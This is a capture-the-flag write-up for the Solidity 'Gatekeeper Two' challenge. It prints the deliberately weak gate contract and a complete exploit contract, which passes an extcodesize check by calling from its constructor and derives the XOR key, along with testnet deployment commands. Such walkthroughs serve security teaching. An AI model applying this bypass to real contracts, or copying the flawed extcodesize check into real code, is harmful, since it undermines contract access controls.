# Level 14: Gatekeeper Two Challenge

## Challenge Description

This level introduces a contract with multiple "gates" that must be passed to become an "entrant". Similar to the previous level, it combines multiple Solidity concepts but introduces different techniques including contract creation context, bitwise operations, and assembly instructions.

## Contract Location

The challenge contract is located at:
```
/contracts/level-14-gatekeeper-2/GatekeeperTwo.sol
```

## Understanding the Challenge

The `GatekeeperTwo` contract has three gates (implemented as modifiers) that must be passed to call the `enter` function and become the entrant. Here's the contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

### The Gates

To become the entrant, you must pass all three gates:

1. **Gate One**: `require(msg.sender != tx.origin)`
   - This requires that the function call is not made directly by an externally owned account (EOA), but through another contract
   - Same as in GatekeeperOne

2. **Gate Two**: `require(extcodesize(caller()) == 0)`
   - This requires that the calling contract has no code size
   - This might seem impossible since contracts need code to execute, but there's a special case where this is true

3. **Gate Three**: `require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)`
   - This requires crafting a special `bytes8` key that, when XORed with a hash of the `msg.sender`, equals the maximum uint64 value

## Winning Strategy

To pass all gates, you need to:

1. Create an intermediary contract that will call the GatekeeperTwo contract (for Gate One)
2. Exploit the fact that during a contract's constructor, the contract's code size is zero (for Gate Two)
3. Craft a special `bytes8` key that satisfies the XOR equation in Gate Three

## Hint for Thinking

Ask yourself:
* At what point in a contract's lifecycle is its code size (extcodesize) zero?
* How does the XOR operation work, and what's the relationship between A ^ B = C and A ^ C = B?
* How can you solve for the correct gateKey using the properties of XOR?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

### Gate One Solution

Gate One requires `msg.sender != tx.origin`. This is solved by using a contract to make the call, just like in GatekeeperOne.

### Gate Two Solution

Gate Two requires `extcodesize(caller()) == 0`, which means the calling contract must have no code size.

This seems contradictory at first glance because contracts need code to execute. However, there's a special case: **during a contract's constructor execution, before the constructor finishes, the contract's code size is zero**.

This is because the code is only stored to the blockchain after the constructor completes execution. During the constructor, the contract exists but its code is not yet stored.

To exploit this, we need to make the call to the GatekeeperTwo's `enter` function from within our exploit contract's constructor.

### Gate Three Solution

Gate Three requires:
```solidity
uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
```

To solve this, we need to understand that:
1. `type(uint64).max` is all 1's in binary (0xffffffffffffffff)
2. XOR has a special property: if A ^ B = C, then A ^ C = B

So we can solve for `_gateKey` as follows:
```
uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) = type(uint64).max
uint64(_gateKey) = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max
```

Another way to think about this: XORing any value with all 1's gives its bitwise complement (NOT). So we're finding the complement of the hash of `msg.sender`.

### Exploit Contract

The solution involves creating a contract that calls the `enter` function from its constructor, with a key calculated using the XOR properties:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
    function entrant() external view returns (address);
}

contract GatekeeperTwoExploit {
    address public owner;
    address public gatekeeperAddress;
    bool public success;
    
    constructor(address _gatekeeperAddress) {
        owner = msg.sender;
        gatekeeperAddress = _gatekeeperAddress;
        
        // We must call the enter function in the constructor because:
        // - Gate One: msg.sender != tx.origin - fulfilled by calling from a contract
        // - Gate Two: extcodesize(caller()) == 0 - fulfilled because during construction, extcodesize is 0
        
        // Generate the gate key for Gate Three
        bytes8 gateKey = generateGateKey(msg.sender);
        
        // Call the enter function
        bool result = IGatekeeperTwo(gatekeeperAddress).enter(gateKey);
        success = result;
    }
    
    function generateGateKey(address _caller) public pure returns (bytes8) {
        // Gate Three requirement:
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
        // To solve for _gateKey:
        // uint64(_gateKey) = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max
        
        bytes8 senderHash = bytes8(keccak256(abi.encodePacked(_caller)));
        return bytes8(uint64(senderHash) ^ type(uint64).max);
    }
    
    function checkSuccess() external view returns (bool) {
        address entrant = IGatekeeperTwo(gatekeeperAddress).entrant();
        return entrant == owner;
    }
}
```

### Execution Steps

1. **Deploy the GatekeeperTwo Contract**

   ```shell
   npx hardhat deploy --tags gatekeeper-two --network sepolia
   ```

2. **Deploy the Exploit Contract**

   This will automatically attempt to make you the entrant in a single transaction:
   
   ```shell
   TARGET_ADDRESS=0xYourGatekeeperTwoAddress npx hardhat deploy --tags gatekeeper-two-solution --network sepolia
   ```

3. **Verify Success**

   ```shell
   EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-14-gatekeeper-2/verify-exploit-success.ts --network sepolia
   ```

## Key Insights

1. **Contract Creation Context**: During a contract's constructor execution, `extcodesize(address(this))` is 0 because the code hasn't been stored to the blockchain yet.

2. **XOR Properties**: XOR is its own inverse operation. This means if A ^ B = C, then A ^ C = B.

3. **Smart Contract Execution Flow**: Understanding the execution flow and state transitions in Ethereum contracts is crucial for security analysis.

## Lessons Learned

1. **Contract Deployment Mechanics**: Be careful about assumptions regarding a contract's state during construction vs. after deployment.

2. **Assembly and Low-Level Operations**: Assembly instructions like `extcodesize` provide direct access to EVM functionality but can introduce unexpected edge cases.

3. **Bitwise Operations**: XOR and other bitwise operations are fundamental to many cryptographic operations and can be manipulated in creative ways.

4. **Defensive Programming**: When designing security checks, consider all possible execution contexts, including the special case of contract construction.
